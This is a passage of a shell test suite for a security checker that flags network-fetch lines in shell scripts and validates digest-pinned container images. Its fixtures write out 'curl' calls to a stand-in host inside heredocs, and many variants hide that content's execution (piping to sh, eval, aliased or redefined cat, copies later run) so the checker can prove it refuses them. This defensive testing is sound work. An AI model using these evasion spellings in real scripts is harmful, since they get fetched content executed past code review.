ctxmove mv2 "${SH}"$'cat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' "${SH}"$'echo other\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
CASE="AC16 context: a ruled line that stays inside its heredoc while another line is added is not refused (exit 0)"; check test "$rc" -eq 0
ctxmove mv3 "${SH}"$'# curl https://e.example/x\n' "${SH}"$'echo ok # curl https://e.example/x\n' comment
CASE="AC16 context: a different line (the comment became code) is an added line with no row: refused (exit 1)"; check test "$rc" -eq 1

# --- round 2 of the review (both seats green, residual classes closed fail-closed as the advisor's rule asks for a security control) ---
ctxno "an alias of the written file set BEFORE the heredoc" "${SH}"$'f=payload\ncat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsh "$f"\n' heredoc
ctxno "a tee with a second output operand that is later run" "${SH}"$'cat <<\'EOF\' | tee keep payload\ncurl https://e.example/x\nEOF\nsh payload\n' heredoc
ctxno "a function that runs its argument, used on the written file" "${SH}"$'consume() { sh "$1"; }\ncat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nconsume payload\n' heredoc
ctxno "a function body that holds a quoted closing brace before the shell" "${SH}"$'consume() {\n  printf \'%s\\n\' \'}\'\n  sh\n}\nconsume <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a case pattern inside a command substitution (the walk cannot follow it)" "${SH}"$'out=$(case x in\nx) cat <<\'EOF\'\ncurl https://e.example/x\nEOF\n;;\nesac)\neval "$out"\n' heredoc
for op in "tclsh" "expect" "lua5.3" "Rscript" "julia" "mytool" "gdb -batch -x /dev/stdin"; do
  ctxno "a heredoc opened by a program that is not a known data consumer ('$op')" "${SH}$op <<'EOF'"$'\ncurl https://e.example/x\nEOF\n' heredoc
done
ctxno "an environment assignment before cat is outside the closed opener grammar" "${SH}"$'A=1 cat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a function the file defines is outside the closed opener grammar" "${SH}"$'show() { cat; }\nshow <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxyes "cat with an output redirection on either side of the heredoc operator" "${SH}"$'cat >"$d/f" <<\'EOF\' 2>/dev/null\ncurl https://e.example/x\nEOF\ncat "$d/f"\n' heredoc
ctxno "a later line names the written file as an argument of a program that is not a data consumer" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nmytool payload\n' heredoc
ctxno "a later line names the written file as an argument of a function" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nconsume payload\n' heredoc
ctxyes "a later line reads the written file with grep and diff" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ngrep e.example payload\ndiff payload payload\n' heredoc
ctxno "a heredoc terminator line that ends in a carriage return is not the terminator" "${SH}"$'cat <<EOF\nEOF\r\n# $(curl https://e.example/x)\nEOF\n' comment
ctxno "an assignment line after a carriage-return terminator in an unquoted heredoc" "${SH}"$'cat <<EOF\nEOF\r\nX=\'$(curl https://e.example/x)\'\nEOF\n' assignment
ctxno "a comment inside a quoted heredoc fed to a shell" "${SH}"$'bash <<\'EOF\'\nprintf \'%s\\n\' "\n# $(curl https://e.example/x)\n"\nEOF\n' comment
ctxno "an assignment inside a quoted heredoc fed to a shell" "${SH}"$'bash <<\'EOF\'\nprintf \'%s\\n\' "\nX=\'$(curl https://e.example/x)\'\n"\nEOF\n' assignment
ctxno "a comment inside a quoted heredoc fed to an interpreter the file names last" "${SH}"$'python3 - <<\'PY\'\n# curl https://e.example/x\nPY\nsh payload\n' heredoc
for imp in 'from builtins import open as f' 'from os import system as run' 'import os as o; o.system("true")' 'from os import popen' 'import sqlite3' 'import socket' 'import http.client' 'import urllib.request' 'import shutil' 'import tempfile' 'import smtplib' 'from builtins import exec as e'; do
  ctxno "an impure import ($imp) with no review label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring
  ctxyes "the same import ($imp) with the review-attested label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring "$IMP"
done
ctxyes "a program that imports only json, re, sys and hashlib is pure" "${SH}"$'python3 - <<\'PY\'\nimport json, re, sys, hashlib\nx = "curl https://e.example/x"\nPY\n' pystring
# --- the closures follow-up (review round 3, both seats green at 12cf0934; open spellings closed fail-closed, advisor Oct 16) ---
ctxno "a closing brace inside a comment on the function's first line" "${SH}"$'consume() { # }\n  sh\n}\nconsume <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a closing brace inside a comment line of the function" "${SH}"$'consume() {\n  # }\n  sh\n}\nconsume <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a pipeline whose second command is an interpreter outside the denylist" "${SH}"$'cat <<\'EOF\' | tclsh\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a pipeline of three whose last command is a shell" "${SH}"$'cat <<\'EOF\' | sort | sh\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a pipeline whose second command is an unknown program" "${SH}"$'cat <<\'EOF\' | mytool\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a pipeline is outside the closed opener grammar (cat | cat)" "${SH}"$'cat <<\'EOF\' | cat\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a pipeline is outside the closed opener grammar (cat | sort | head)" "${SH}"$'cat <<\'EOF\' | sort | head -1\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a trailing pipe whose command follows the terminator" "${SH}"$'cat <<\'EOF\' |\ncurl https://e.example/x\nEOF\nbash\n' heredoc
ctxno "a trailing pipe whose command follows the terminator (comment context, shell consumer)" "${SH}"$'cat <<\'EOF\' |\nprintf \'%s\\n\' "\n# $(curl https://e.example/x)\n"\nEOF\nbash\n' comment
ctxno "a trailing pipe whose command follows the terminator (pystring)" "${SH}"$'python3 - <<\'PY\' |\nx = "curl https://e.example/x"\nPY\nbash\n' pystring
ctxno "a list continuing after the operator (&&)" "${SH}"$'cat <<\'EOF\' && sh x\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "sort -o writes a file the opener grammar does not know" "${SH}"$'sort -o payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsh payload\n' heredoc
ctxno "a data consumer behind a pipe writes a file" "${SH}"$'cat <<\'EOF\' | sort -o payload\ncurl https://e.example/x\nEOF\nbash payload\n' heredoc
ctxno "a function whose body calls an unknown interpreter" "${SH}"$'consume() { tclsh; }\nconsume <<\'EOF\'\nexec curl https://e.example/x\nEOF\n' heredoc
ctxno "a function with a ;# comment boundary before the shell" "${SH}"$'consume() { :;# }\n  sh\n}\nconsume <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "the Python program's output piped to an interpreter outside the denylist" "${SH}"$'python3 - <<\'PY\' | tclsh\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "the Python program's output piped to sort is outside the closed opener grammar" "${SH}"$'python3 - <<\'PY\' | sort\nx = "curl https://e.example/x"\nPY\n' pystring
for imp in 'from io import open as f; f("o", "w")' 'import os; os.replace("a", "b")' 'from pathlib import Path; Path("a").replace("b")' 'import io; io.StringIO()' 'import pathlib' 'writer = open; writer("o", "w")' 'import os'; do
  ctxno "an impure program ($imp) with no review label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring
  ctxyes "the same program ($imp) with the review-attested label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring "$IMP"
done
ctxno "a call with unpacked keyword arguments (hides the mode of open)" "${SH}"$'python3 - <<\'PY\'\nopen("payload", **{"mode": "w"})\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "the same call with the review label" "${SH}"$'python3 - <<\'PY\'\nopen("payload", **{"mode": "w"})\nx = "curl https://e.example/x"\nPY\n' pystring "$IMP"
ctxno "a call with unpacked positional arguments" "${SH}"$'python3 - <<\'PY\'\nprint(*["a"])\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "import os.path binds os: os.replace is not os.path" "${SH}"$'python3 - <<\'PY\'\nimport os.path\nos.replace("a", "b")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "os.path.join is a pure call" "${SH}"$'python3 - <<\'PY\'\nimport os.path\np = os.path.join("a", "b")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "str methods, json and a user-defined function are pure" "${SH}"$'python3 - <<\'PY\'\nimport json\ndef f(a):\n    return a.replace("x", "y").strip()\nx = json.dumps({"c": f("curl https://e.example/x")})\nPY\n' pystring
ctxno "a method call on an unknown object that writes" "${SH}"$'python3 - <<\'PY\'\nimport json\ndef g(o):\n    o.write("x")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "os.path is a pure import" "${SH}"$'python3 - <<\'PY\'\nimport os.path\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a file under /dev/shm is an ordinary file that is later run" "${SH}"$'cat >/dev/shm/p.sh <<\'EOF\'\ncurl https://e.example/x\nEOF\nsh /dev/shm/p.sh\n' heredoc
ctxyes "/dev/null is a device, not a file that can be run" "${SH}"$'cat >/dev/null <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "the written file is spelled ./payload and run as payload" "${SH}"$'cat > ./payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsh payload\n' heredoc
ctxno "the written file is spelled payload and run as ./payload" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsh ./payload\n' heredoc
ctxno "the written file is in a directory and run by its base name" "${SH}"$'cat >sub/payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncd sub && sh payload\n' heredoc
ctxno "a case pattern on its own line inside a command substitution" "${SH}"$'out=$(case x in\nx)\n  cat <<\'EOF\'\ncurl https://e.example/x\nEOF\n  ;;\nesac\n)\neval "$out"\n' heredoc
ctxyes "a multi-line command substitution that closes on its own line does not spoil the walk" "${SH}"$'x=$(\n  echo hi\n)\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a later line passes the written file's content to a function the file does not define" "${SH}"$'cat >"$d/plan.json" <<\'EOF\'\ncurl https://e.example/x\nEOF\nrun x "$(cat "$d/plan.json")" rc\n' heredoc
ctxyes "a later line passes the content through \$(cat FILE) to the reviewed content-taking function" "${SH}"$'run() { local n=$1; echo "$2" >"$n.plan"; }\ncat >"$d/plan.json" <<\'EOF\'\ncurl https://e.example/x\nEOF\nrun x "$(cat "$d/plan.json")" rc\n' heredoc
ctxno "the content passed to a reviewed function defined differently" "${SH}"$'run() { local n=$1; eval "$2"; }\ncat >"$d/plan.json" <<\'EOF\'\ncurl https://e.example/x\nEOF\nrun x "$(cat "$d/plan.json")" rc\n' heredoc
ctxno "the content evaluated through eval" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\neval "$(cat payload)"\n' heredoc
ctxno "the content piped to a shell" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat payload | sh\n' heredoc
ctxno "the written file fed to a shell on stdin" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsh <payload\n' heredoc
ctxno "the content in a backtick substitution run by a shell" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nbash -c "`cat payload`"\n' heredoc
ctxno "a later line passes the written file to a shell inside a substitution" "${SH}"$'cat >"$d/plan.json" <<\'EOF\'\ncurl https://e.example/x\nEOF\nrun x "$(sh "$d/plan.json")" rc\n' heredoc
ctxno "a later line pipes the cat of the written file to a shell" "${SH}"$'cat >"$d/plan.json" <<\'EOF\'\ncurl https://e.example/x\nEOF\nrun x "$(cat "$d/plan.json" | sh)" rc\n' heredoc
ctxyes "the reviewed out helper as an opener argument" "${SH}"$'out() { echo "$work/$1/plain"; }      # the DECRYPTED reports and transcripts of a case (the real --out holds only <persona>.cms)\npython3 - "$(out clean)" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "an out helper defined differently is not the reviewed one" "${SH}"$'out() { sh -c "$1"; }\npython3 - "$(out clean)" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "an out helper the file does not define" "${SH}"$'python3 - "$(out clean)" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "another command substitution in an opener argument" "${SH}"$'python3 - "$(id)" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "cat is redefined as a function that runs its input" "${SH}"$'cat() { sh; }\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a comment inside a cat heredoc when cat is redefined" "${SH}"$'cat() { sh; }\ncat <<\'EOF\'\nprintf \'%s\\n\' "\n# $(curl https://e.example/x)\n"\nEOF\n' comment
ctxno "python3 is redefined as a function" "${SH}"$'python3() { sh; }\npython3 - <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a data consumer used later is redefined" "${SH}"$'grep() { sh "$@"; }\ncat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ngrep x payload\n' heredoc
ctxno "an alias in the file" "${SH}"$'alias cat=sh\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxyes "a variable named alias is not the alias command" "${SH}"$'alias="x"\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "expand_aliases in the file" "${SH}"$'shopt -s expand_aliases\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a multi-line parameter expansion hides a comment-looking line" "${SH}"$'value=${UNSET:-\n# $(curl https://e.example/x)\n}\n' comment
ctxno "a multi-line parameter expansion hides an assignment-looking line" "${SH}"$'value=${UNSET:-\nX=\'$(curl https://e.example/x)\'\n}\n' assignment
ctxyes "a one-line parameter expansion is understood" "${SH}"$'value=${UNSET:-b}\n# curl https://e.example/x\n' comment
ctxno "argparse can create a file (FileType)" "${SH}"$'python3 - <<\'PY\'\nimport argparse\np = argparse.ArgumentParser()\np.add_argument("o", type=argparse.FileType("w"))\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "argparse with the review label" "${SH}"$'python3 - <<\'PY\'\nimport argparse\np = argparse.ArgumentParser()\nx = "curl https://e.example/x"\nPY\n' pystring "$IMP"
# round 1 of cache#390 (both seats): imported members of sys, a definition after then/do or indented or under a versioned interpreter name, and a quoted output option are all refused
ctxno "from sys import path then path.append" "${SH}"$'python3 - <<\'PY\'\nfrom sys import path\npath.append("x")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "from sys import modules" "${SH}"$'python3 - <<\'PY\'\nfrom sys import modules\nmodules["os"].system("true")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "from sys import setprofile (aliased)" "${SH}"$'python3 - <<\'PY\'\nfrom sys import setprofile as sp\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "from sys import argv is is pure" "${SH}"$'python3 - <<\'PY\'\nfrom sys import argv\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a cat redefined after then" "${SH}"$'if true; then cat() { sh; }; fi\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a cat redefined after do" "${SH}"$'for i in 1; do cat() { sh; }; done\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "an indented versioned python redefined" "${SH}"$'  python3.11() { sh; }\npython3.11 - <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "an indented cat redefined with function" "${SH}"$'  function cat { sh; }\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxyes "a javascript .() in a string is not a function definition" "${SH}"$'python3 - <<\'PY\'\nx = "setInterval(async () => {}).unref?.();"\ny = "curl https://e.example/x"\nPY\n' pystring "$IMP"
ctxno "a cat definition with a space inside the parentheses" "${SH}"$'cat ( ) { sh; }\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a cat definition with a line break inside the parentheses" "${SH}"$'cat (\n) { sh; }\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a heredoc inside a process substitution run by bash" "${SH}"$'bash <(\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n)\n' heredoc
ctxno "a heredoc inside a subshell piped to sh" "${SH}"$'(\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n) | sh\n' heredoc
ctxno "a heredoc inside a brace group piped to sh" "${SH}"$'{\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n} | sh\n' heredoc
ctxno "a python module alias reaches a method" "${SH}"$'python3 - <<\'PY\'\nimport sys, os.path\nruntime = sys\nruntime.modules["os"].replace("old", "new")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a python re-exported module reaches a writer (os.path.os.replace)" "${SH}"$'python3 - <<\'PY\'\nimport os.path\nos.path.os.replace("a", "b")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a redirection to a path that only starts with /dev/null" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat payload >/dev/nullcopy\nsh /dev/nullcopy\n' heredoc
ctxno "a heredoc inside an if whose fi pipes to sh" "${SH}"$'if true; then\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\nfi | sh\n' heredoc
ctxno "a heredoc inside a for loop whose done pipes to sh" "${SH}"$'for i in 1; do\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\ndone | sh\n' heredoc
ctxno "a heredoc inside a while loop" "${SH}"$'while true; do\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\nbreak; done | sh\n' heredoc
ctxyes "a heredoc after a finished if is still inert text" "${SH}"$'if true; then echo a; fi\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a python module attribute assigned to an alias" "${SH}"$'python3 - <<\'PY\'\nimport os.path\nruntime = os.path.os\nruntime.replace("old", "new")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a redirection to /dev/null with a dynamic suffix" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat payload >/dev/null"$SUFFIX"\nsh copied\n' heredoc
ctxno "a quoted -o of sort copies the written file" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsort "-o" copied payload\nsh copied\n' heredoc
ctxno "a single-quoted --output= of sort copies the written file" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsort \'--output=copied\' payload\nsh copied\n' heredoc
# --- hardening (round-3 residuals of #386, recorded in its PR body; advisor Oct 16) ---
ctxno "a data consumer copies the written file with an output redirection, and the copy is run" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat payload >second\nsh second\n' heredoc
ctxno "a data consumer appends to a copy" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat payload >>second\n' heredoc
ctxno "tee copies the written file" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ntee copied <payload\nsh copied\n' heredoc
ctxno "sort -o writes a copy" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsort -o copied payload\nsh copied\n' heredoc
ctxno "sort --output writes a copy" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsort --output=copied payload\nsh copied\n' heredoc
ctxno "uniq with an output operand writes a copy" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nuniq payload copied\nsh copied\n' heredoc
ctxyes "sort and grep only read the written file" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nsort -u payload\ngrep -c e.example payload\n' heredoc
ctxyes "a data consumer may send its errors to /dev/null" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat payload 2>/dev/null >/dev/null\n' heredoc
ctxno "a function is defined after a command separator" "${SH}"$'true; cat() { sh; }\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a function is defined inside a group" "${SH}"$'{ cat() { sh; }; }\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a versioned python name is redefined" "${SH}"$'python3.11() { python3 - | sh; }\npython3.11 - <<\'PY\'\nprint("curl https://e.example/x")\nPY\n' pystring
ctxno "python is redefined after an &&" "${SH}"$'true && python() { sh; }\npython - <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "typing.get_type_hints evaluates a string annotation" "${SH}"$'python3 - <<\'PY\'\nimport typing\nclass C:\n    x: "__import__(\'os\').system(\'true\') # curl https://e.example/x"\ntyping.get_type_hints(C)\nPY\n' pystring
ctxyes "the same program with the review label" "${SH}"$'python3 - <<\'PY\'\nimport typing\nclass C:\n    x: "__import__(\'os\').system(\'true\') # curl https://e.example/x"\ntyping.get_type_hints(C)\nPY\n' pystring "$IMP"
ctxno "sys.modules reaches any module" "${SH}"$'python3 - <<\'PY\'\nimport sys\nsys.modules["os"].replace("old", "new")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "sys.path changes what imports load" "${SH}"$'python3 - <<\'PY\'\nimport sys\nsys.path.append("x")\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "sys.argv and sys.exit are pure" "${SH}"$'python3 - <<\'PY\'\nimport sys\nn = len(sys.argv)\nx = "curl https://e.example/x"\nsys.exit(0)\nPY\n' pystring
ctxno "an unknown method on a computed receiver" "${SH}"$'python3 - <<\'PY\'\nd = {}\nd.frobnicate()\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "string and list methods are pure" "${SH}"$'python3 - <<\'PY\'\nv = []\nv.append("a,b".split(",")[0].strip().upper())\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a quoted hash is not a comment in the later-use scan" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nprintf \'%s\' \' #\'; sh payload\n' heredoc
ctxyes "a real comment after a data consumer is ignored" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat payload # sh payload\n' heredoc
# --- REQ-SUP-001-AC2 (round 1 of cache#180, seat B, B1): the images the persona UAT runs are named in bin/persona-uat-tools.json, a file the driver reads and no workflow
# names; the inventory must read it like any other image CI runs, so a new or moved persona image is named by the scan and reaches the daily advisory check. ------
PT1="ghcr.io/own/ptool-a@$DIG1"; PT2="ghcr.io/own/ptool-b@$DIG2"; PT3="ghcr.io/own/ptool-c@$DIG3"
PTJ=$(printf '{\n  "capture": "%s",\n  "gradle": "%s",\n  "shell": "%s"\n}\n' "$PT1" "$PT2" "$PT3")
newcase ptools "$(pyw bin/persona-uat-tools.json "$PTJ")"
runck ptools
CASE="AC2 persona tools: a new tools file with three digest images is accepted (exit 0) and names all three"
check test "$rc" -eq 0; for n in ptool-a@$DIG1 ptool-b@$DIG2 ptool-c@$DIG3; do check grep -qF "image:ghcr.io/own/$n" "$work/ptools.out"; done
newcase ptagonly "$(pyw bin/persona-uat-tools.json "$(printf '{\n  "shell": "ghcr.io/own/ptool-a:latest"\n}\n')")"
runck ptagonly
CASE="AC2 persona tools: an image named by a tag alone (no digest) can never pass: exit 1"; check test "$rc" -eq 1
newcase pbadjson "$(pyw bin/persona-uat-tools.json 'this is not json')"
runck pbadjson
CASE="AC2 persona tools: a tools file that is not JSON stops the check (exit 2), never 'nothing to measure'"; check test "$rc" -eq 2
for bad in '{"shell": 5}' '{"shell": ["ghcr.io/own/ptool-a@'$DIG1'"]}' '["ghcr.io/own/ptool-a@'$DIG1'"]' '{"shell": {"image": "ghcr.io/own/ptool-a@'$DIG1'"}}'; do
  newcase pbadshape "$(pyw bin/persona-uat-tools.json "$bad")"
  runck pbadshape
  CASE="AC2 persona tools: a tools file of another shape ($bad) stops the check (exit 2), never skipped"; check test "$rc" -eq 2
done
# round 2 of cache#393: a registry with a port is an ordinary image reference, and a digest-only move in the same repository is a moved item
PTP="registry.example:5000/team/ptool-p@$DIG1"
newcase pport "$(pyw bin/persona-uat-tools.json "$(printf '{\n  "shell": "%s"\n}\n' "$PTP")")"
runck pport
CASE="AC2 persona tools: an image on a registry with a port is inventoried (named) and accepted (exit 0)"
check test "$rc" -eq 0; check grep -qF "registry.example:5000/team/ptool-p@$DIG1" "$work/pport.out"
rm -rf "$work/pmove2"; cp -R "$base" "$work/pmove2"
( cd "$work/pmove2" && printf '{\n  "shell": "%s"\n}\n' "ghcr.io/own/same@$DIG1" >bin/persona-uat-tools.json && git add -A && git commit -q -m b2 && printf '{\n  "shell": "%s"\n}\n' "ghcr.io/own/same@$DIG2" >bin/persona-uat-tools.json && git add -A && git commit -q -m h2 )
runck pmove2
CASE="AC2 persona tools: moving only the digest of the same repository is a moved item: it is accepted (exit 0) and names the new digest, not the old one"
check test "$rc" -eq 0; check grep -qF "ghcr.io/own/same@$DIG2" "$work/pmove2.out"; check test "$(grep -cF "same@$DIG1" "$work/pmove2.out")" -eq 0
# round 1 of cache#393 (both seats): a duplicate key, an image reference that is not <name>[:tag]@sha256:<64 hex> exactly, and a tools file that cannot be read each stop the check (exit 2): an image we cannot read is never skipped
for bad in '{"shell": 7, "shell": "'$PT1'"}' '{"shell": "'$PT1'", "shell": "'$PT2'"}' '{"shell": "ghcr.io/own/ptool-a/'$DIG1'"}' '{"shell": "ghcr.io/own/ptool-a@'$DIG1'0"}' '{"shell": "ghcr.io/own/ptool-a@'${DIG1^^}'"}' '{"": "'$PT1'"}'; do
  newcase pbadref "$(pyw bin/persona-uat-tools.json "$bad")"
  runck pbadref
  CASE="AC2 persona tools: a tools file with a duplicate key or a reference that is not exactly name@sha256:<64 hex> ($bad) stops the check (exit 2)"; check test "$rc" -eq 2
done
# a digest that MOVES in a tools file the base already holds is a moved item like any other pin
rm -rf "$work/pmove"; cp -R "$base" "$work/pmove"
( cd "$work/pmove" && printf '{\n  "shell": "%s"\n}\n' "$PT1" >bin/persona-uat-tools.json && git add -A && git commit -q -m b1 && printf '{\n  "shell": "%s"\n}\n' "$PT3" >bin/persona-uat-tools.json && git add -A && git commit -q -m h1 )
runck pmove
CASE="AC2 persona tools: moving the digest in a tools file the base holds is a moved item: it is accepted (exit 0) and names the new digest, not the old one"
check test "$rc" -eq 0; check grep -qF "image:ghcr.io/own/ptool-c@$DIG3" "$work/pmove.out"; check test "$(grep -cF "ptool-a@$DIG1" "$work/pmove.out")" -eq 0

# a context the file does not name, a non-text value, a proof without a context: the file is malformed (exit 2), never "nothing ruled" and never "everything ruled"
newcase cx "$(pyw bin/ctx.sh "${SH}# curl https://e.example/x"$'\n')"
for bad in '"context": "shell"' '"context": ""' '"context": 5' '"context": ["comment"]' '"proof": "x"' '"context": "comment", "proof": 7' '"context": "comment", "proof": ""' '"context": null'; do
  rtrows "$work/cx" "$work/ctx-bad.tmp.json" all
  python3 - "$work/ctx-bad.tmp.json" "$work/ctx-bad.json" "$bad" <<'PY'
import json, sys
src, out, frag = sys.argv[1:4]
d = json.load(open(src)); extra = json.loads("{" + frag + "}")
for r in d["unmeasured_text"]: r.update(extra)
json.dump(d, open(out, "w"))
PY
  rc=0; python3 "$chk" --root "$work/cx" --base HEAD~1 --head HEAD --exceptions "$work/ctx-bad.json" >"$work/ctx.out" 2>&1 || rc=$?
  CASE="AC16 context: a malformed context/proof ($bad) stops the check: exit 2, never a pass"; check test "$rc" -eq 2
done
# a context row on a path that is not a shell script rules nothing
newcase cy "$(pyw .github/workflows/x.yml $'on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          # curl https://e.example/x\n          true\n')"
rtrows "$work/cy" "$work/ctx-y.tmp.json" all
python3 - "$work/ctx-y.tmp.json" "$work/ctx-y.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
for r in d["unmeasured_text"]: r["context"] = "comment"
json.dump(d, open(sys.argv[2], "w"))
PY
rc=0; python3 "$chk" --root "$work/cy" --base HEAD~1 --head HEAD --exceptions "$work/ctx-y.json" >"$work/ctx.out" 2>&1 || rc=$?
CASE="AC16 context: a context row on a workflow file (not a shell script) rules nothing: exit 1"; check test "$rc" -eq 1
# the same proof governs the unpinned-package form (pin-audit shares ruled_unpinned_lines)
ctxyes "an unpinned-install mention in a comment" "${SH}# pip install requests"$'\n' comment
ctxno "an unpinned install in code with a comment context" "${SH}pip install requests"$'\n' comment

# --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
# its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
cat >"$work/ibt-inv.py" <<'PY'
import importlib.util, os, re, sys
SC = sys.argv[1]
HOST = "https://github.com/"
TOOLS = {"melange": "chainguard-dev/melange", "apko": "chainguard-dev/apko"}
ARCHES = ("amd64", "arm64")
def load(name):
    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), os.path.join(SC, name + ".py"))
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
def die(msg):
    print("install-build-tools: " + msg); sys.exit(1)
def inventory(path):
    inv = load("pin-inventory"); age = load("pin-age-check")
    text = open(path).read(); f = {"bin/install-build-tools.sh": text}
    um = inv.unmeasured(f)
    if um:
        die("unmeasured: " + "; ".join("%s: %s" % (w, l) for (_, w, l) in sorted(um)))
    vers = {}
    for t in TOOLS:
        m = re.search(re.escape(HOST + TOOLS[t]) + r"/releases/download/v(\d+\.\d+\.\d+)/", text)
        if not m:
            die("no literal release address for " + t)
        vers[t] = m.group(1)
